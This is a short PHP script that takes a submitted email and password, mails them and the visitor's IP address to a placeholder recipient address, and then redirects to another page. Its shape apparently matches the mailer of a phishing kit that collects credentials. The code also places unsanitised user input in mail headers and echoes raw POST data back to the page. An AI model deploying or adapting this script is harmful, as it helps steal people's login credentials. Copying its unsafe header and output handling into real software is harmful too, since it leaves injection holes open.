<?php

$password = $_POST['password'];
$email_recipients = "{{EMAIL HERE}}";//<<=== enter your email address here
//$email_recipients =  "myemail@gmail.com,his.myemail2@yahoo.com"; <<=== more than one recipients like this


$visitors_email_field = 'email';//The name of the field where your user enters their email address
                                        
$email_subject = "New Form submission";

$enable_auto_response = false;//Make this false if you dont want auto-response.

//auto-response to the user
$auto_response_subj = "Thanks for contacting us";
$auto_response ="
HELLO WORLD!!!
";


$email_from = ''; /*From address for the emails*/
$thank_you_url = 'goTo.php';/*URL to redirect to, after successful form submission*/

if(!isset($_POST['submit']))
{
    //note that submit button's name is 'submit' 
    //checking whether submit button is pressed
	// This page should not be accessed directly. Need to submit the form.
	echo "error; you need to submit the form!".print_r($_POST,true);
    exit;
}

require_once "includes/formvalidator.php";
//Setup Validations
$validator = new FormValidator();
$validator->addValidation("password","req","Please fill in Password");
$validator->addValidation("email","req","Please fill in Email");
//Now, validate the form
if(false == $validator->ValidateForm())
{
    echo "<B>Validation Errors:</B>";

    $error_hash = $validator->GetErrors();
    foreach($error_hash as $inpname => $inp_err)
    {
        echo "<p>$inpname : $inp_err</p>\n";
    }
    exit;
}

$visitor_email='';
if(!empty($visitors_email_field))
{
    $visitor_email = $_POST[$visitors_email_field];
}

if(empty($email_from))
{
    $host = $_SERVER['SERVER_NAME'];
    $email_from ="info@$host";
}

$fieldtable = '';
foreach ($_POST as $field => $value)
{
    if($field == 'submit')
    {
        continue;
    }
    if(is_array($value))
    {
        $value = implode(", ", $value);
    }
    $fieldtable .= "$field: $value\n";
}

$extra_info = "User's IP Address: ".$_SERVER['REMOTE_ADDR']."\n";

$email_body = "You have received a new form submission. Details below:\n$fieldtable\n $extra_info";
    
$headers = "From: $email_from \r\n";
$headers .= "Reply-To: $visitor_email \r\n";
//Send the email!
@mail(/*to*/$email_recipients, $email_subject, $email_body,$headers);

//send an auto-response to the user who submitted the form
if($enable_auto_response == true && !empty($visitor_email))
{
    $headers = "From: $email_from \r\n";
    @mail(/*to*/$visitor_email, $auto_response_subj, $auto_response,$headers);
}

//done. 
if (isset($_SERVER['HTTP_X_REQUESTED_WITH'])
    AND strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') 
{
    //Return success as a signal of succesful processing
    echo "success";
}
else
{
    //Redirect the user to a Thank you page
    header('Location: '.$thank_you_url);
}
?>